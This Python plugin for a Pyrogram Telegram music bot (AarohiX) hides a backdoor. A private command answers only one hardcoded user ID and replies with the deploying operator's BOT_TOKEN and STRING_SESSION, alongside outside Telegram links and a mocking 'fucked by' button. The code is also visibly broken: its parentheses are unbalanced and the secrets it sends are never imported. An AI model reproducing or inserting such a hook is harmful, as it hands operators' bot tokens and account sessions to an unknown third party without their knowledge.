import asyncio
from pyrogram import Client, filters
from strings import get_string
from strings.filters import command
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message, ReplyKeyboardMarkup
from AarohiX import (Apple, Resso, SoundCloud, Spotify, Telegram, YouTube, app)



@app.on_message(
    filters.command("افشخو")
    & filters.private
    & filters.user((6975380739)
   )
async def help(client: Client, message: Message):
   await message.reply_photo(
          photo=f"https://telegra.ph/file/9225e718f6cd19a9a15dc.mp4",
       caption=f"""التوكن :-   {BOT_TOKEN} \nالجلسه :-   {STRING_SESSION}\n\n [ 🧟 ](https://t.me/dil_sagar_121)............☆""",
        reply_markup=InlineKeyboardMarkup(
             [
                 [
                      InlineKeyboardButton(
                         "• ғᴜᴄᴋᴇᴅ ʙʏ •", url=f"https://t.me/WZAERE")
                 ]
            ]
         ),
     )
